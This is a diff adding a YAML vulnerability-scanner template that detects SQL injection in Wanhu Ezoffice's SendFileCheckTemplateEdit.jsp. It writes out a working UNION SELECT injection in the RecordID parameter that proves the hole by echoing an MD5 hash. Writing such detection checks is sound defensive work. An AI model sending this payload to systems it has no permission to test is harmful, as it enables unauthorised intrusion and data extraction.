@@ -1,0 +1,28 @@
+id: poc-yaml-wanhu-oa-sendfilechecktemplateedit-jsp-sqli
+info:
+  name: 万户Ezoffice SendFileCheckTemplateEdit.jsp SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects potential SQL injection vulnerability in 万户Ezoffice SendFileCheckTemplateEdit.jsp by verifying the execution of a custom MD5 hash using SQL functions.
+
+variables:
+  t1: "{{rand_text_alphanumeric(6)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}'))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
